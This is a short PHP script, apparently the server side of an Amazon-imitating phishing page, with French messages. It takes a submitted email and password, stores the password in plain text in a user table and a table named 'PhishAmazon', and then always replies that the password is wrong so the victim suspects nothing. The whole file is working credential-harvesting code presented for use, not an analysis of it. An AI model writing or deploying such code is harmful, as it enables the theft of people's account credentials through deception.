<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");

require 'db.php';

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['email']) && isset($_POST['motdepasse'])) {
        $email = $_POST['email'];
        $motdepasse = $_POST['motdepasse'];

        try {
            $sql = "SELECT id FROM `user` WHERE email = :email";
            $stmt = $pdo->prepare($sql);
            $stmt->execute(['email' => $email]);
            $user = $stmt->fetch(PDO::FETCH_ASSOC);

            if (!$user) {
                $sql = "INSERT INTO `user` (email, motdepasse) VALUES (:email, :motdepasse)";
                $stmt = $pdo->prepare($sql);
                $stmt->execute(['email' => $email, 'motdepasse' => $motdepasse]);

                $user_id = $pdo->lastInsertId();
                echo "";
            } else {
                $user_id = $user['id'];
                echo "Utilisateur trouvé. Utilisation de l'ID existant.";
            }

            $sql = "INSERT INTO PhishAmazon (user_id, motdepasse) VALUES (:user_id, :motdepasse)";
            $stmt = $pdo->prepare($sql);
            $stmt->execute(['user_id' => $user_id, 'motdepasse' => $motdepasse]);
            echo "Erreur, mot de passe incorrect !";
        } catch (Exception $e) {
            echo "Erreur lors de l'inscription : " . $e->getMessage();
        }
    } else {
        echo "Tous les champs sont obligatoires.";
    }
} else {
    echo "Méthode non autorisée. Utilisez une requête POST.";
}
?>
